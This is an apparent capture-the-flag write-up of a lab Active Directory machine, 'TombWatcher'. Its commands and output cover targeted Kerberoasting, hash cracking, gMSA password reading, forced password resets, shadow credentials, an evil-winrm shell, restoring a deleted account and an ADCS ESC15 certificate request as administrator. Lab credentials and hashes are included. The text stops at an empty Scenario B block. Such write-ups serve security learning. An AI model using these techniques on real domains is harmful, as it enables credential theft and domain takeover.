![[Pasted image 20260204222706.png]]
- We quickly see by inspecting `Shortest Paths from Owned Objects` that `henry` has `WriteSPN` over `alfred`

### WriteSPN (Targeted Kerberoast)
- Kerberoasting is targeting a service account because it has service principal name (SPN) configured, which means that any authenticated user can request a TGS for that account. 
- That TGS is encrypted with the service account’s password, and if that password is weak, it can be bruteforced offline with something like `hashcat`.

# User Auth - Alfred
## Targeted Kerberoast
---
- Targeted Kerberoasting involves adding an SPN to an account, and then Kerberoasting it (and ideally removing it after)
- While Alfred is almost certainly a user and not a service account, with the `WriteSPN` access over the account, we can make it Kerberoastable and look for a weak password.

### via BloodyAD / nxc
- We can use `bloodyAD` to write a service principal name (SPN) to `alfred`:
```sh
❯ bloodyad -d tombwatcher.bth -u henry -p H3nry_987TGV! -H DC01.tombwatcher.htb set object alfred servicePrincipalName -v 'http/whatever'
[+] alfred's servicePrincipalName has been updated
```

- Now we can dump the encrypted hash with `nxc`:
```sh
❯ nxc ldap 10.129.12.205 -u henry -p H3nry_987TGV! -k --kerberoast kerberoasting.hashes
LDAP        10.129.12.205   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.12.205   389    DC01             [-] tombwatcher.htb\henry:H3nry_987TGV! KRB_AP_ERR_SKEW
```

- We need to fix the clock skew with `ntpdate` first:
```sh
❯ sudo ntpdate 10.129.12.205
```

```sh
❯ nxc ldap 10.129.12.205 -u henry -p H3nry_987TGV! -k --kerberoast kerberoasting.hashes
LDAP        10.129.12.205   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.12.205   389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.129.12.205   389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.12.205   389    DC01             [*] Total of records returned 1
LDAP        10.129.12.205   389    DC01             [*] sAMAccountName: Alfred, memberOf: [], pwdLastSet: 2025-05-12 11:17:03.526670, lastLogon: <never>
LDAP        10.129.12.205   389    DC01             $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$241597e1cbba3fd951913aea5d718594$1be6a1e3cad1e4147562a4e79ca45b3abe1bb2e5ec4f702f99cde19b8812c5c823e654f0d51247b12f4df7eae9d7a77efe45f1af908f0f45c8e30baf1828224507ff2661976274573418557722faabcdc8ed5726388c6612af65b7366c9f86ce746649804f9d9c46b96956c0d3fd4c2b25ef256f6b1fbdc8ab2f7813113ed370c5171958486f92cdfcda41a037c940b87954200ae4dde226b9a9db50248c06696622739e9c8e17c5ab4037d4f58b4eadfa32e0049ff89a4d87f9d22b12351e8adbbc2a0bc97612d14fb008c5fe05777898b28aa63eb19f2252daf94b49d430e4ad9b407a9a040e008fd1fad1bf48137f54317f898b18eb943922b7f106d60d1748bb4f4e1b2101182a1acb83bdff7800f24293af9216421e7847e4b86e63c69a0b14cca85279563732d20fe20f6fb6a77f8c724b506bfa5a7214616d54fbf1b71dda3dd83b8a92ba6cdf8cbe690acb7f3c5a3a605c51cfd59cf8233acfefa67992b0e85fb2db7f9d4b3b48e7568857829243a805ca3a92b815746848f262b24b834539897476a7f21c9afcde7565cc3bf815e59e6551a8b9c0a244f053826b22e79f30ce737ca770f015196bd167865a739cded65eadbb7001c6a77aa3bc96afd7b24a6a2e1faa12ec1823ab4a21eb425b8aae649e2a264f8f33f8fbd53d150fe2038f6775c22ccb6b4e0bc2f5b02f7d648ca44ebe1e07fd122afb4415aa2e9e83ab3a72e01e25f4b3a039b9d3b939b3727731e9ef07eec72b6832b78c9cf71df7396714a9702b4149dd3b019e10008e1865c1296b689f2395d7aa4d3c3598e3a9afe6fb0cc60783196ba814cbb07477f3ecdc7a1829d0f2af549f305ce012e1b76b516dc027b0d4b829c17285aac0a4d7720526d8d0a733c5a5ed54332da11e2af7ac7a3035e5cc70fd54a5c979944477eedaa6cc21428b1360093d1ac232a03073e1e4d45a0fddf8b9189d5c6e2ab694003435ed5d5035b5e7efbeb82d50934aefb2d5f386c936c0dd60f52dfe457606bec900909cebe1df32e0044f9e87dcaa7663abed3c51e2f3313c8e83955a7146306f0e29ab64a93ff283b005f63cf9a3d8c8499baffada8b1e0f84de051e5c6f4d6d376ca1129c8d6445aafc02d1776305484eda67ccbe31288d811c6cd9c3fa8fd81093d258c3dd31f58cd3397035a4939c89f03c78c75c5d318dac2d75a04134a10ff1f3b65f89ccc31e76a26d65ef3e9533cb182934668bb591c88c9d5dfbf87d352f07dab5467f347636bacdc280296db6d352b336790ff222af70528e912bd09af254a5f949483155461598dfb61526f60a05ffa01ace720ed64b976f02491dc39e42255f2e5b0ce216530bfdc147840158dac7916c8f8c49b570fabb0a1036f5daae4077213635f3518af8d25f3d558db869139b98e7b690edf1b74f18809617c2d6152d0f5a6a519ae7e2ada6e58ade9f72f0db2cee61813127bd4747409aeda3
```
- Nice! that looks a lot better

### Hashcat
```sh
❯ hashcat kerberoasting.hashes ~/ctf/TOOLS/wordlist/rockyou.txt 
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$241597e1cbba3fd951913aea5d718594$1be6a1e3cad1e4147562a4e79ca45b3abe1bb2e5ec4f702f99cde19b8812c5c823e654f0d51247b12f4df7eae9d7a77efe45f1af908f0f45c8e30baf1828224507ff2661976274573418557722faabcdc8ed5726388c6612af65b7366c9f86ce746649804f9d9c46b96956c0d3fd4c2b25ef256f6b1fbdc8ab2f7813113ed370c5171958486f92cdfcda41a037c940b87954200ae4dde226b9a9db50248c06696622739e9c8e17c5ab4037d4f58b4eadfa32e0049ff89a4d87f9d22b12351e8adbbc2a0bc97612d14fb008c5fe05777898b28aa63eb19f2252daf94b49d430e4ad9b407a9a040e008fd1fad1bf48137f54317f898b18eb943922b7f106d60d1748bb4f4e1b2101182a1acb83bdff7800f24293af9216421e7847e4b86e63c69a0b14cca85279563732d20fe20f6fb6a77f8c724b506bfa5a7214616d54fbf1b71dda3dd83b8a92ba6cdf8cbe690acb7f3c5a3a605c51cfd59cf8233acfefa67992b0e85fb2db7f9d4b3b48e7568857829243a805ca3a92b815746848f262b24b834539897476a7f21c9afcde7565cc3bf815e59e6551a8b9c0a244f053826b22e79f30ce737ca770f015196bd167865a739cded65eadbb7001c6a77aa3bc96afd7b24a6a2e1faa12ec1823ab4a21eb425b8aae649e2a264f8f33f8fbd53d150fe2038f6775c22ccb6b4e0bc2f5b02f7d648ca44ebe1e07fd122afb4415aa2e9e83ab3a72e01e25f4b3a039b9d3b939b3727731e9ef07eec72b6832b78c9cf71df7396714a9702b4149dd3b019e10008e1865c1296b689f2395d7aa4d3c3598e3a9afe6fb0cc60783196ba814cbb07477f3ecdc7a1829d0f2af549f305ce012e1b76b516dc027b0d4b829c17285aac0a4d7720526d8d0a733c5a5ed54332da11e2af7ac7a3035e5cc70fd54a5c979944477eedaa6cc21428b1360093d1ac232a03073e1e4d45a0fddf8b9189d5c6e2ab694003435ed5d5035b5e7efbeb82d50934aefb2d5f386c936c0dd60f52dfe457606bec900909cebe1df32e0044f9e87dcaa7663abed3c51e2f3313c8e83955a7146306f0e29ab64a93ff283b005f63cf9a3d8c8499baffada8b1e0f84de051e5c6f4d6d376ca1129c8d6445aafc02d1776305484eda67ccbe31288d811c6cd9c3fa8fd81093d258c3dd31f58cd3397035a4939c89f03c78c75c5d318dac2d75a04134a10ff1f3b65f89ccc31e76a26d65ef3e9533cb182934668bb591c88c9d5dfbf87d352f07dab5467f347636bacdc280296db6d352b336790ff222af70528e912bd09af254a5f949483155461598dfb61526f60a05ffa01ace720ed64b976f02491dc39e42255f2e5b0ce216530bfdc147840158dac7916c8f8c49b570fabb0a1036f5daae4077213635f3518af8d25f3d558db869139b98e7b690edf1b74f18809617c2d6152d0f5a6a519ae7e2ada6e58ade9f72f0db2cee61813127bd4747409aeda3:basketball
```
- Looks like our password was cracked! We've got `basketball`

- We can verify that the password works with `nxc`:
```sh
❯ nxc smb 10.129.12.205 -u alfred -p basketball
SMB         10.129.12.205   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.205   445    DC01             [+] tombwatcher.htb\alfred:basketball 
```

### Cleanup SPN
- We can clean up the Service Principal Name by setting it to nothing:
```sh
bloodyad -d tombwatcher.bth -u henry -p H3nry_987TGV! -H DC01.tombwatcher.htb set object alfred servicePrincipalName 
```

# User Auth - ANSIBLE_DEV$
## Bloodhound - Alfred
---
![[Pasted image 20260205024947.png]]
- `Alfred` has the `AddSelf` to the `INFRASTRUCTURE` group which can `ReadGMSAPassword` from the `ANSIBLE_DEV$` account

## AddSelf
---
- We can add `alfred` to the `INFRASTRUCTURE` group with `bloodyAD`:
```sh
❯ bloodyad -u alfred -p basketball -d tombwatcher.htb -H DC01.tombwatcher.htb add groupMember Infrastructure alfred
[+] alfred added to Infrastructure
```

## ReadGMSAPassword
---
- Now we can perform `ReadGMSAPassword` for `ANSIBLE_DEV$` with `nxc`:
```sh
❯ nxc ldap 10.129.12.205 -u alfred -p basketball --gmsa                                             
LDAP        10.129.12.205   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.12.205   389    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAP        10.129.12.205   389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.12.205   389    DC01             Account: ansible_dev$         NTLM: 22d7972cb291784b28f3b6f5bc79e4cf     PrincipalsAllowedToReadPassword: Infrastructure
```
- The `NTML` hash is `22d7972cb291784b28f3b6f5bc79e4cf`

- We can verify that the credentials work:
```sh
❯ nxc smb 10.129.12.205 -u ANSIBLE_DEV$ -H 22d7972cb291784b28f3b6f5bc79e4cf
SMB         10.129.12.205   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.205   445    DC01             [+] tombwatcher.htb\ANSIBLE_DEV$:22d7972cb291784b28f3b6f5bc79e4cf 
```

# User Auth - Sam
## Bloodhound - Sam
---
![[Pasted image 20260205025247.png]]
- `ANSIBLE_DEV$` has `ForceChangePassword` over the user `Sam`
- We can perform that action with `bloodyAD`

## ForceChangePassword
---
```sh
❯ bloodyad -d tombwatcher.htb -H DC01.tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':22d7972cb291784b28f3b6f5bc79e4cf' set password 'sam' 'password'
[+] Password changed successfully!
```

- We can verify that we succeeded with `nxc`:
```sh
❯ nxc smb 10.129.12.205 -u sam -p password                                              
SMB         10.129.12.205   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.205   445    DC01             [+] tombwatcher.htb\sam:password 
```

# User Shell - John
## Bloodhound - John
---
![[Pasted image 20260205025833.png]]
- `Sam` has `WriteOwner` over `John` who is a member of the `Remote Management Users`, meaning that with `John`'s credentials we can use `evilWinRM`

## WriteOwner
---
- With `WriteOwner`, we can set `Sam` as the owner of the `John` account
- As owner, `Sam` can give themself `genericAll` over `John`
- From there, `Sam` can either set `John`’s password, get a shadow credential, or targeted Kerberoast

### Shadow Credential
- First, we need to set the owner of `John` to `Sam` via `bloodyAD`
```sh
❯ bloodyad -u sam -p password -d tombwatcher.htb -H DC01.tombwatcher.htb set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

- Next, we'll give `Sam` `GenericAll` over `John`:
```sh
❯ bloodyad -u sam -p password -d tombwatcher.htb -H DC01.tombwatcher.htb add genericAll john sam
[+] sam has now GenericAll on john
```

- Now we can use `certipy` to perform the shadow credential attack:
```sh
❯ certipy shadow auto -target DC01.tombwatcher.htb -u sam -p password -account john
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a4373b2331304906b42a182dbf2fbfe6'
[*] Adding Key Credential with device ID 'a4373b2331304906b42a182dbf2fbfe6' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID 'a4373b2331304906b42a182dbf2fbfe6' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf
```
- Now we've got an `NT` has for `John`, `ad9324754583e3e42b55aad4d3b8d2bf`

### Shell
- We can verify that we've got remote access as `john` with `nxc`:
```sh
❯ nxc winrm 10.129.12.205 -u john -H ad9324754583e3e42b55aad4d3b8d2bf
WINRM       10.129.12.205   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) 
WINRM       10.129.12.205   5985   DC01             [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf (Pwn3d!)
```

- We can use `evil-winrm` to grab a shell as `john`:
```sh
❯ evil-winrm -i 10.129.12.205 -u john -H ad9324754583e3e42b55aad4d3b8d2bf
*Evil-WinRM* PS C:\Users\john\Desktop> cat user.txt
b775f2d04d92d49f5b5cb4d63eef8082
```

- There's nothing interesting in `john`'s home directory
- There are no other interesting users in the `Users` directory
- There's nothing interesting in the filesystem root either
- The `inetpub/wwwroot` directory is empty:
```powershell
    Directory: C:\inetpub\wwwroot
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/15/2024   7:57 PM                aspnet_client
-a----       11/15/2024   7:57 PM            703 iisstart.htm
-a----       11/15/2024   7:57 PM          99710 iisstart.png
```

## Bloodhound - John Again
---
![[Pasted image 20260205031403.png]]
- `john` has `GenericAll` over the `ADCS` organization unit (OU), but it's unclear why that would be useful at this time

# User Auth - cert_admin
## ADCS
---
- We can utilize `certipy` to search for search for vulnerable templates
```sh
❯ certipy find -target DC01.tombwatcher.htb -u john -hashes ad9324754583e3e42b55aad4d3b8d2bf
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving text output to '20260205033456_Certipy.txt'
[*] Wrote text output to '20260205033456_Certipy.txt'
[*] Saving JSON output to '20260205033456_Certipy.json'
[*] Wrote JSON output to '20260205033456_Certipy.json'
```

- There are 2 certificates that have potential attack vectors:
```sh
  19
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Computers
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  
  32
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```
- The `Domain Computers` group has enrollment rights to cert `19` and `ANSIBLE_DEV$` is a member of said group

- Another point of interest is cert `17`:
```sh
  17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
```
- It's odd that one of the objects is shown by it’s SID and not by name
- This implies that `certipy` wasn’t able to resolve the user’s information

- We can try to get information on the host about the `SID`:
```powershell
*Evil-WinRM* PS C:\inetpub\wwwroot> Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-1111"
Cannot find an object with identity: 'S-1-5-21-1392491010-1358638721-2126982587-1111' under: 'DC=tombwatcher,DC=htb'.
At line:1 char:1
+ Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-111 ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (S-1-5-21-139249...2126982587-1111:ADObject) [Get-ADObject], ADIdentityNotFoundException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException,Microsoft.ActiveDirectory.Management.Commands.GetADObject
```
- This suggests an object may have been deleted

## AD Recycle Bin
---
- The AD Recycle Bin feature allows admins to recover deleted AD objects. It is installed and active on TombWatcher:
```powershell
*Evil-WinRM* PS C:\inetpub\wwwroot> Get-ADOptionalFeature 'Recycle Bin Feature'

DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=tombwatcher,DC=htb
EnabledScopes      : {CN=Partitions,CN=Configuration,DC=tombwatcher,DC=htb, CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=tombwatcher,DC=htb}
FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
FeatureScope       : {ForestOrConfigurationSet}
IsDisableable      : False
Name               : Recycle Bin Feature
ObjectClass        : msDS-OptionalFeature
ObjectGUID         : 907469ef-52c5-41ab-ad19-5fdec9e45082
RequiredDomainMode :
RequiredForestMode : Windows2008R2Forest
```

- We can perform the following command to list deleted items:
```powershell
*Evil-WinRM* PS C:\inetpub\wwwroot> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
```
- The user was `cert_admin`

### Restoring Recycled User
- Because `john` has `GenericAll` over ADCS and ADCS is `cert_admin`'s `lastKnownParent`, `john` should be able to to resurrect the account
- We'll need to grab the `ObjectGUID` for the specific instance of `cert_admin` that was cited in cert `17`:
```powershell
*Evil-WinRM* PS C:\inetpub\wwwroot> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf 
*Evil-WinRM* PS C:\inetpub\wwwroot> Get-ADUser cert_admin

DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
Surname           : cert_admin
UserPrincipalName :
```
- It worked!!

### Reset Password
- With `GenericAll` over the entire `OU`, `john` can compromise the `cert_admin` in many ways
- Given that the account was deleted, it seems safe to just change the password:
```powershell
*Evil-WinRM* PS C:\inetpub\wwwroot> Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'password' -AsPlainText -Force)
```

```sh
❯ nxc smb 10.129.12.205 -u cert_admin -p password                               
SMB         10.129.12.205   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.205   445    DC01             [+] tombwatcher.htb\cert_admin:password 
```

# Root Shell
## Enumeration
---
- As `cert_admin`, we can re-run `certipy` to look for vulnerable templates:
```sh
❯ certipy find -target DC01.tombwatcher.htb -u cert_admin -p password -vulnerable -stdout

Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

## ESC-15
---
- We can take a peek at the [certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) 
- The key indicators for the vulnerability are:
	- Enrollee supplies subject 
	- Schema version is 1
	- Environment hasn't been patched for CVE-2024-49019
- The wiki shows two scenarios

### Scenario A (FAIL)
- We can use the `req` feature to request a certificate as the `administrator` user and inject into the certificate that it can be used for client auth
```sh
❯ certipy req -u cert_admin -p password -dc-ip 10.129.12.205 -target DC01.tombwatcher.htb -ca tombwatcher-CA-1 -template 'WebServer' -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'       
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

- Now we can try to authenticate with pfx:
```sh
❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.12.205' -ldap-shell
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.129.12.205:636'
[-] Failed to connect to LDAP server: ("('socket ssl wrapping error: [SSL: CA_MD_TOO_WEAK] ca md too weak (_ssl.c:4100)',)",)
[-] Use -debug to print a stacktrace
```
- Looks like an `SSL` error. We could probably try downgrading but let's see if we can just roll with option B

### Scenario B
- This time instead of giving the resulting certificate the ability to authenticate, I'll give it the agent property:
```sh
